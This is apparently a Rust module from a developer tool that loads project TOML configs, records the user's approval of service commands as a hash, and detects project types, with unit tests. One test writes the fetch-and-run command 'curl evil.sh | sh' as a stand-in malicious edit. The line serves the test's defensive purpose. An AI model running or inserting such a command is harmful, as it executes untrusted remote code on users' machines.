use std::path::{Path, PathBuf};

use crate::error::{Result, VoidStackError};
use crate::model::Project;

const CONFIG_FILENAME: &str = "void-stack.toml";

/// Load a project config from a TOML file.
///
/// # Trust model
/// `void-stack.toml` is **trusted input**: service `command` strings are
/// executed verbatim via the platform shell (`sh -c` / `cmd /c`) when the
/// project starts. Never start services from a config you haven't reviewed —
/// see [`is_project_trusted`] / [`mark_project_trusted`] for the one-time
/// confirmation used by the launchers.
pub fn load_project(path: &Path) -> Result<Project> {
    let config_path = resolve_config_path(path);
    let content = std::fs::read_to_string(&config_path)
        .map_err(|_| VoidStackError::ConfigNotFound(config_path.display().to_string()))?;
    let project: Project = toml::from_str(&content)?;
    Ok(project)
}

/// Save a project config to a TOML file.
pub fn save_project(project: &Project, dir: &Path) -> Result<()> {
    let config_path = dir.join(CONFIG_FILENAME);
    let content = toml::to_string_pretty(project)
        .map_err(|e| VoidStackError::InvalidConfig(e.to_string()))?;
    std::fs::write(&config_path, content)?;
    Ok(())
}

/// Resolve where the config file is. Accepts either a directory or a file path.
fn resolve_config_path(path: &Path) -> PathBuf {
    if path.is_file() {
        path.to_path_buf()
    } else {
        path.join(CONFIG_FILENAME)
    }
}

/// User-private trust store: canonical project path → SHA-256 digest of the
/// approved service command set. Lives OUTSIDE the project tree so a cloned
/// repository can never ship its own approval, and the digest binds the
/// approval to the exact commands — editing void-stack.toml (or pulling a
/// change) re-prompts.
fn trust_store_path() -> PathBuf {
    // Test/CI override so suites never touch the user's real store.
    if let Ok(p) = std::env::var("VOID_STACK_TRUST_STORE") {
        return PathBuf::from(p);
    }
    dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("void-stack")
        .join("trusted-projects.json")
}

fn trust_store_key(project_dir: &Path) -> String {
    std::fs::canonicalize(project_dir)
        .unwrap_or_else(|_| project_dir.to_path_buf())
        .to_string_lossy()
        .to_string()
}

/// Stable SHA-256 digest over the service command set (name, command,
/// working_dir, env vars), sorted so ordering changes don't re-prompt.
fn service_commands_digest(project: &Project) -> String {
    use sha2::{Digest, Sha256};
    let mut entries: Vec<String> = project
        .services
        .iter()
        .map(|s| {
            format!(
                "{}\x1f{}\x1f{}\x1f{:?}",
                s.name,
                s.command,
                s.working_dir.as_deref().unwrap_or(""),
                s.env_vars
            )
        })
        .collect();
    entries.sort();
    let mut hasher = Sha256::new();
    for e in &entries {
        hasher.update(e.as_bytes());
        hasher.update([0u8]);
    }
    crate::fs_util::to_hex(&hasher.finalize())
}

fn load_trust_store() -> std::collections::HashMap<String, String> {
    std::fs::read_to_string(trust_store_path())
        .ok()
        .and_then(|c| serde_json::from_str(&c).ok())
        .unwrap_or_default()
}

/// True when the user already confirmed this project's CURRENT service
/// commands. Approval is keyed by canonical path and bound to a digest of
/// the command set — any change to the commands invalidates it.
pub fn is_project_trusted(project_dir: &Path, project: &Project) -> bool {
    load_trust_store()
        .get(&trust_store_key(project_dir))
        .is_some_and(|digest| *digest == service_commands_digest(project))
}

/// Record the user's approval to execute this project's current service
/// commands. Stored in the user's config dir, never inside the project.
pub fn mark_project_trusted(project_dir: &Path, project: &Project) -> Result<()> {
    let mut store = load_trust_store();
    store.insert(
        trust_store_key(project_dir),
        service_commands_digest(project),
    );
    let path = trust_store_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(&path, serde_json::to_string_pretty(&store)?)?;
    Ok(())
}

/// Re-key a trust approval when a project is renamed/moved. If the OLD
/// project (path + commands) was approved, the approval carries over to the
/// new path/commands — the move itself is mechanical, the commands the user
/// blessed are the same ones modulo rewritten working dirs. Anything not
/// previously approved stays unapproved. Returns true when an approval was
/// migrated.
pub fn rekey_trusted_project(
    old_dir: &Path,
    old_project: &Project,
    new_dir: &Path,
    new_project: &Project,
) -> Result<bool> {
    let mut store = load_trust_store();
    // The old dir typically no longer exists when re-keying (it was already
    // renamed), so canonicalization falls back to the raw path while the
    // stored key was canonical. Try both forms, plus canonical-parent+name.
    let mut candidates = vec![trust_store_key(old_dir)];
    candidates.push(old_dir.to_string_lossy().to_string());
    if let (Some(parent), Some(name)) = (old_dir.parent(), old_dir.file_name())
        && let Ok(canon_parent) = std::fs::canonicalize(parent)
    {
        candidates.push(canon_parent.join(name).to_string_lossy().to_string());
    }
    let old_digest = service_commands_digest(old_project);
    let Some(old_key) = candidates
        .into_iter()
        .find(|k| store.get(k).is_some_and(|d| *d == old_digest))
    else {
        return Ok(false);
    };
    store.remove(&old_key);
    store.insert(
        trust_store_key(new_dir),
        service_commands_digest(new_project),
    );
    let path = trust_store_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(&path, serde_json::to_string_pretty(&store)?)?;
    Ok(true)
}

/// Auto-detect project type by inspecting files in the directory.
pub fn detect_project_type(path: &Path) -> crate::model::ProjectType {
    use crate::model::ProjectType;

    // Order matters: more specific manifests are checked first so that a
    // Phoenix project (root `mix.exs` + root `package.json` for assets
    // tooling) is correctly classified as Elixir and not Node. Same for
    // a Rust project that happens to ship a JS bundler config alongside
    // Cargo.toml.
    if path.join("Cargo.toml").exists() {
        ProjectType::Rust
    } else if path.join("mix.exs").exists() {
        ProjectType::Elixir
    } else if path.join("pubspec.yaml").exists() {
        ProjectType::Flutter
    } else if path.join("go.mod").exists() {
        ProjectType::Go
    } else if has_unity_markers(path) {
        // Engine projects before Python/Node: a Unity or Godot repo often
        // carries a requirements.txt / package.json for tooling.
        ProjectType::Unity
    } else if has_godot_markers(path) {
        ProjectType::Godot
    } else if has_swift_markers(path) {
        ProjectType::Swift
    } else if has_metatrader_markers(path) {
        ProjectType::MetaTrader
    } else if has_cpp_manifest(path) {
        // A C/C++ build manifest is more specific than the requirements.txt
        // or package.json a native repo often carries for its tooling.
        ProjectType::Cpp
    } else if path.join("pyproject.toml").exists()
        || path.join("requirements.txt").exists()
        || path.join("setup.py").exists()
    {
        ProjectType::Python
    } else if path.join("package.json").exists() {
        ProjectType::Node
    } else if has_unreal_markers(path) {
        ProjectType::Unreal
    } else if has_makefile_with_sources(path) {
        // A bare Makefile is the weakest signal: only when nothing above
        // matched and C/C++ sources sit next to it.
        ProjectType::Cpp
    } else if path.join("docker-compose.yml").exists()
        || path.join("docker-compose.yaml").exists()
        || path.join("Dockerfile").exists()
    {
        ProjectType::Docker
    } else {
        ProjectType::Unknown
    }
}

/// Check whether a directory carries Unreal Engine / UEFN markers: any
/// `*.uproject` or `*.uplugin` file, or any `*.verse` source file at the
/// top level of the directory.
pub fn has_unreal_markers(dir: &Path) -> bool {
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return false,
    };
    entries.flatten().any(|entry| {
        let path = entry.path();
        path.is_file()
            && path
                .extension()
                .and_then(|e| e.to_str())
                .is_some_and(|ext| {
                    ext.eq_ignore_ascii_case("uproject")
                        || ext.eq_ignore_ascii_case("uplugin")
                        || ext.eq_ignore_ascii_case("verse")
                })
    })
}

/// Unity project root: `ProjectSettings/ProjectVersion.txt`, or both the
/// `Assets/` and `ProjectSettings/` folders.
pub fn has_unity_markers(dir: &Path) -> bool {
    dir.join("ProjectSettings")
        .join("ProjectVersion.txt")
        .is_file()
        || (dir.join("Assets").is_dir() && dir.join("ProjectSettings").is_dir())
}

/// Godot project root: `project.godot`.
pub fn has_godot_markers(dir: &Path) -> bool {
    dir.join("project.godot").is_file()
}

/// Swift project root: `Package.swift` (SwiftPM), or a top-level
/// `*.xcodeproj` / `*.xcworkspace` bundle (Xcode).
pub fn has_swift_markers(dir: &Path) -> bool {
    if dir.join("Package.swift").is_file() {
        return true;
    }
    let Ok(entries) = std::fs::read_dir(dir) else {
        return false;
    };
    entries.flatten().any(|e| {
        e.path()
            .extension()
            .and_then(|x| x.to_str())
            .is_some_and(|x| {
                x.eq_ignore_ascii_case("xcodeproj") || x.eq_ignore_ascii_case("xcworkspace")
            })
    })
}

/// MetaTrader sources at the root of `dir`, or `dir` is (or holds) a
/// terminal's `MQL4` / `MQL5` data folder.
pub fn has_metatrader_markers(dir: &Path) -> bool {
    const SOURCES: &[&str] = &["mq4", "mq5", "mqh"];
    if ["MQL4", "MQL5"].iter().any(|d| dir.join(d).is_dir()) {
        return true;
    }
    if dir.join("Experts").is_dir() && dir.join("Include").is_dir() {
        return true;
    }
    let Ok(entries) = std::fs::read_dir(dir) else {
        return false;
    };
    entries.flatten().any(|e| {
        e.path()
            .extension()
            .and_then(|x| x.to_str())
            .is_some_and(|x| SOURCES.iter().any(|s| x.eq_ignore_ascii_case(s)))
    })
}

/// C / C++ project root: a build manifest ([`has_cpp_manifest`]) or a
/// `Makefile` next to C/C++ sources.
pub fn has_cpp_markers(dir: &Path) -> bool {
    has_cpp_manifest(dir) || has_makefile_with_sources(dir)
}

/// C / C++ build manifests at the root of `dir`: `meson.build`,
/// `vcpkg.json`, `conanfile.txt` / `conanfile.py`, a `CMakeLists.txt` that
/// declares `project()`, or an MSBuild C++ project. Unreal projects also
/// ship a `.sln` / `.vcxproj`; those stay Unreal.
pub fn has_cpp_manifest(dir: &Path) -> bool {
    if has_unreal_markers(dir) {
        return false;
    }
    ["meson.build", "vcpkg.json", "conanfile.txt", "conanfile.py"]
        .iter()
        .any(|f| dir.join(f).is_file())
        || cmake_declares_project(&dir.join("CMakeLists.txt"))
        || has_msbuild_cpp_project(dir)
}

/// The top-level `CMakeLists.txt` of a tree declares `project(...)`; the
/// lists pulled in with `add_subdirectory` usually don't, so `src/` or
/// `tests/` of a CMake tree are not surfaced as projects of their own.
fn cmake_declares_project(path: &Path) -> bool {
    std::fs::read_to_string(path).is_ok_and(|text| {
        text.lines().any(|line| {
            let l = line.trim_start().to_ascii_lowercase();
            l.starts_with("project(") || l.starts_with("project (")
        })
    })
}

/// A `*.vcxproj` at the root, or a `*.sln` that references one (a `.sln`
/// alone may be a C# solution).
pub fn has_msbuild_cpp_project(dir: &Path) -> bool {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return false;
    };
    entries.flatten().any(|e| {
        let p = e.path();
        match p.extension().and_then(|x| x.to_str()) {
            Some(x) if x.eq_ignore_ascii_case("vcxproj") => p.is_file(),
            Some(x) if x.eq_ignore_ascii_case("sln") => {
                std::fs::read_to_string(&p).is_ok_and(|s| s.contains(".vcxproj"))
            }
            _ => false,
        }
    })
}

/// A `Makefile` with C/C++ sources at the root or in `src/`.
pub fn has_makefile_with_sources(dir: &Path) -> bool {
    const SOURCES: &[&str] = &["c", "cc", "cpp", "cxx"];
    if !["Makefile", "makefile", "GNUmakefile"]
        .iter()
        .any(|f| dir.join(f).is_file())
    {
        return false;
    }
    [dir.to_path_buf(), dir.join("src")].iter().any(|d| {
        std::fs::read_dir(d).is_ok_and(|entries| {
            entries.flatten().any(|e| {
                e.path()
                    .extension()
                    .and_then(|x| x.to_str())
                    .is_some_and(|x| SOURCES.iter().any(|s| x.eq_ignore_ascii_case(s)))
            })
        })
    })
}

/// Game-engine / platform stacks detected from markers rather than one
/// fixed manifest (used by the ignore generators, which may need several
/// sections for one repo — e.g. a Unity project with a Swift plugin).
pub fn marker_stacks(dir: &Path) -> Vec<crate::model::ProjectType> {
    use crate::model::ProjectType;
    let mut out = Vec::new();
    if has_unreal_markers(dir) {
        out.push(ProjectType::Unreal);
    }
    if has_unity_markers(dir) {
        out.push(ProjectType::Unity);
    }
    if has_godot_markers(dir) {
        out.push(ProjectType::Godot);
    }
    if has_swift_markers(dir) {
        out.push(ProjectType::Swift);
    }
    if has_metatrader_markers(dir) {
        out.push(ProjectType::MetaTrader);
    }
    if has_cpp_markers(dir) {
        out.push(ProjectType::Cpp);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn test_detects_unity_godot_and_swift_projects() {
        use crate::model::ProjectType;

        let unity = tempdir().unwrap();
        fs::create_dir_all(unity.path().join("ProjectSettings")).unwrap();
        fs::write(
            unity.path().join("ProjectSettings/ProjectVersion.txt"),
            "m_EditorVersion: 6000.0.23f1\n",
        )
        .unwrap();
        // Tooling manifests must not win over the engine marker.
        fs::write(unity.path().join("package.json"), "{}").unwrap();
        assert_eq!(detect_project_type(unity.path()), ProjectType::Unity);

        let unity_dirs = tempdir().unwrap();
        fs::create_dir_all(unity_dirs.path().join("Assets")).unwrap();
        fs::create_dir_all(unity_dirs.path().join("ProjectSettings")).unwrap();
        assert!(has_unity_markers(unity_dirs.path()));
        // `Assets/` alone (any web project) is not Unity.
        let assets_only = tempdir().unwrap();
        fs::create_dir_all(assets_only.path().join("Assets")).unwrap();
        assert!(!has_unity_markers(assets_only.path()));

        let godot = tempdir().unwrap();
        fs::write(godot.path().join("project.godot"), "config_version=5\n").unwrap();
        fs::write(godot.path().join("requirements.txt"), "").unwrap();
        assert_eq!(detect_project_type(godot.path()), ProjectType::Godot);

        let spm = tempdir().unwrap();
        fs::write(
            spm.path().join("Package.swift"),
            "// swift-tools-version:5.9\n",
        )
        .unwrap();
        assert_eq!(detect_project_type(spm.path()), ProjectType::Swift);

        let xcode = tempdir().unwrap();
        fs::create_dir_all(xcode.path().join("App.xcodeproj")).unwrap();
        assert!(has_swift_markers(xcode.path()));
        assert_eq!(marker_stacks(xcode.path()), vec![ProjectType::Swift]);
    }

    #[test]
    fn test_detects_metatrader_projects() {
        use crate::model::ProjectType;

        let experts = tempdir().unwrap();
        fs::write(experts.path().join("Bot.mq4"), "void OnTick() {}\n").unwrap();
        assert_eq!(detect_project_type(experts.path()), ProjectType::MetaTrader);

        let data_dir = tempdir().unwrap();
        fs::create_dir_all(data_dir.path().join("Experts")).unwrap();
        fs::create_dir_all(data_dir.path().join("Include")).unwrap();
        assert!(has_metatrader_markers(data_dir.path()));

        let terminal = tempdir().unwrap();
        fs::create_dir_all(terminal.path().join("MQL5")).unwrap();
        assert_eq!(
            marker_stacks(terminal.path()),
            vec![ProjectType::MetaTrader]
        );

        assert!(!has_metatrader_markers(tempdir().unwrap().path()));
    }

    #[test]
    fn test_detects_cpp_projects() {
        use crate::model::ProjectType;

        // CMake root with a tooling requirements.txt: C++ wins.
        let cmake = tempdir().unwrap();
        fs::write(
            cmake.path().join("CMakeLists.txt"),
            "cmake_minimum_required(VERSION 3.21)\nproject(terrain_viewer CXX)\n",
        )
        .unwrap();
        fs::write(cmake.path().join("requirements.txt"), "mcp\n").unwrap();
        assert_eq!(detect_project_type(cmake.path()), ProjectType::Cpp);
        assert_eq!(marker_stacks(cmake.path()), vec![ProjectType::Cpp]);

        // A sub-directory CMakeLists without project() is not a project.
        let sub = tempdir().unwrap();
        fs::write(
            sub.path().join("CMakeLists.txt"),
            "add_library(core STATIC a.cpp)\n",
        )
        .unwrap();
        assert!(!has_cpp_markers(sub.path()));
        assert_eq!(detect_project_type(sub.path()), ProjectType::Unknown);

        for manifest in ["vcpkg.json", "meson.build", "conanfile.txt", "conanfile.py"] {
            let d = tempdir().unwrap();
            fs::write(d.path().join(manifest), "").unwrap();
            assert_eq!(
                detect_project_type(d.path()),
                ProjectType::Cpp,
                "{manifest}"
            );
        }

        let vcxproj = tempdir().unwrap();
        fs::write(vcxproj.path().join("App.vcxproj"), "<Project/>").unwrap();
        assert_eq!(detect_project_type(vcxproj.path()), ProjectType::Cpp);

        let cpp_sln = tempdir().unwrap();
        fs::write(
            cpp_sln.path().join("App.sln"),
            "Project(\"{8BC9}\") = \"App\", \"App\\App.vcxproj\", \"{1}\"\n",
        )
        .unwrap();
        assert!(has_cpp_markers(cpp_sln.path()));

        // A C# solution is not C++.
        let cs_sln = tempdir().unwrap();
        fs::write(
            cs_sln.path().join("App.sln"),
            "Project(\"{FAE0}\") = \"App\", \"App\\App.csproj\", \"{1}\"\n",
        )
        .unwrap();
        assert!(!has_cpp_markers(cs_sln.path()));

        // Makefile + sources (root or src/); a Makefile alone is not enough.
        let make = tempdir().unwrap();
        fs::write(make.path().join("Makefile"), "all:\n\tcc main.c\n").unwrap();
        assert!(!has_cpp_markers(make.path()));
        fs::create_dir_all(make.path().join("src")).unwrap();
        fs::write(make.path().join("src/main.c"), "int main(){}\n").unwrap();
        assert_eq!(detect_project_type(make.path()), ProjectType::Cpp);

        // Unreal ships a .sln + .vcxproj: it stays Unreal.
        let unreal = tempdir().unwrap();
        fs::write(unreal.path().join("Game.uproject"), "{}").unwrap();
        fs::write(unreal.path().join("Game.vcxproj"), "<Project/>").unwrap();
        assert_eq!(detect_project_type(unreal.path()), ProjectType::Unreal);
        assert_eq!(marker_stacks(unreal.path()), vec![ProjectType::Unreal]);

        // Rust stays first even with a CMake helper next to Cargo.toml.
        let rust = tempdir().unwrap();
        fs::write(rust.path().join("Cargo.toml"), "[package]\nname=\"x\"\n").unwrap();
        fs::write(rust.path().join("CMakeLists.txt"), "project(x)\n").unwrap();
        assert_eq!(detect_project_type(rust.path()), ProjectType::Rust);
    }

    fn sample_toml() -> &'static str {
        r#"
name = "my-app"
description = "Test project"
path = "."

[[services]]
name = "backend"
command = "python manage.py runserver"
target = "wsl"

[[services]]
name = "frontend"
command = "npm run dev"
target = "windows"
"#
    }

    #[test]
    fn test_trust_digest_changes_with_commands() {
        let mut project = Project {
            name: "t".into(),
            path: "/tmp/t".into(),
            description: String::new(),
            project_type: None,
            tags: vec![],
            services: vec![crate::model::Service {
                name: "web".into(),
                command: "npm run dev".into(),
                target: crate::model::Target::native(),
                working_dir: None,
                enabled: true,
                env_vars: vec![],
                depends_on: vec![],
                docker: None,
            }],
            hooks: None,
        };
        let d1 = service_commands_digest(&project);
        project.services[0].command = "curl evil.sh | sh".into();
        let d2 = service_commands_digest(&project);
        assert_ne!(d1, d2, "editing a command must invalidate the approval");
    }

    #[test]
    fn test_trust_store_lives_outside_project_tree() {
        // A cloned repo must never be able to ship its own approval:
        // the store path is under the user config dir, not the project.
        let store = trust_store_path();
        assert!(
            !store.starts_with("/tmp") && store.to_string_lossy().contains("void-stack"),
            "unexpected trust store location: {}",
            store.display()
        );
    }

    #[test]
    fn test_load_project() {
        let dir = tempdir().unwrap();
        let config = dir.path().join(CONFIG_FILENAME);
        fs::write(&config, sample_toml()).unwrap();

        let project = load_project(dir.path()).unwrap();
        assert_eq!(project.name, "my-app");
        assert_eq!(project.services.len(), 2);
        assert_eq!(project.services[0].name, "backend");
        assert_eq!(project.services[1].target, crate::model::Target::Windows);
    }

    #[test]
    fn test_save_and_reload() {
        let dir = tempdir().unwrap();
        let config = dir.path().join(CONFIG_FILENAME);
        fs::write(&config, sample_toml()).unwrap();

        let project = load_project(dir.path()).unwrap();
        save_project(&project, dir.path()).unwrap();
        let reloaded = load_project(dir.path()).unwrap();

        assert_eq!(project.name, reloaded.name);
        assert_eq!(project.services.len(), reloaded.services.len());
    }

    #[test]
    fn test_detect_python() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("requirements.txt"), "flask").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Python
        );
    }

    #[test]
    fn test_detect_node() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("package.json"), "{}").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Node
        );
    }

    #[test]
    fn test_detect_unknown() {
        let dir = tempdir().unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Unknown
        );
    }

    #[test]
    fn test_detect_phoenix_with_root_package_json_picks_elixir() {
        // Regression for Bug 3: Phoenix projects often have a root
        // `package.json` for asset tooling alongside `mix.exs`. The
        // mix.exs marker is more specific (it's the canonical Elixir
        // project file) and must win.
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("mix.exs"),
            "defmodule App.MixProject do\nend\n",
        )
        .unwrap();
        fs::write(dir.path().join("package.json"), "{\"name\":\"app-assets\"}").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Elixir
        );
    }

    #[test]
    fn test_detect_unreal_uproject() {
        // A `.uproject` file marks an Unreal Engine project.
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("MyGame.uproject"), "{}").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Unreal
        );
    }

    #[test]
    fn test_detect_unreal_uplugin() {
        // A `.uplugin` file (UEFN plugin projects) also marks Unreal.
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("MyPlugin.uplugin"), "{}").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Unreal
        );
    }

    #[test]
    fn test_detect_unreal_top_level_verse_file() {
        // Loose `.verse` sources at the top level (UEFN creative islands)
        // mark the project as Unreal even without a .uproject manifest.
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("my_device.verse"),
            "using { /Fortnite.com/Devices }\n",
        )
        .unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Unreal
        );
    }

    #[test]
    fn test_detect_unreal_wins_over_docker_fallback() {
        // Unreal markers must be checked before the Docker fallback.
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("MyGame.uproject"), "{}").unwrap();
        fs::write(dir.path().join("Dockerfile"), "FROM alpine\n").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Unreal
        );
    }

    #[test]
    fn test_detect_rust_wins_over_unreal_markers() {
        // More specific manifests keep priority: Cargo.toml stays Rust
        // even when a .verse file sits alongside it.
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("Cargo.toml"), "[package]\nname=\"x\"\n").unwrap();
        fs::write(dir.path().join("tool.verse"), "using { MyModule }\n").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Rust
        );
    }

    #[test]
    fn test_has_unreal_markers_ignores_subdirectories() {
        // Only top-level files count as markers; a nested .verse file in a
        // subdirectory does not make the root an Unreal project by itself.
        let dir = tempdir().unwrap();
        let sub = dir.path().join("Content");
        fs::create_dir(&sub).unwrap();
        fs::write(sub.join("device.verse"), "using { MyModule }\n").unwrap();
        assert!(!has_unreal_markers(dir.path()));
        assert!(has_unreal_markers(&sub));
    }

    #[test]
    fn test_detect_rust_with_root_package_json_picks_rust() {
        // Same rule for Rust workspaces that ship a JS bundler config.
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("Cargo.toml"), "[package]\nname=\"x\"\n").unwrap();
        fs::write(dir.path().join("package.json"), "{}").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Rust
        );
    }
}
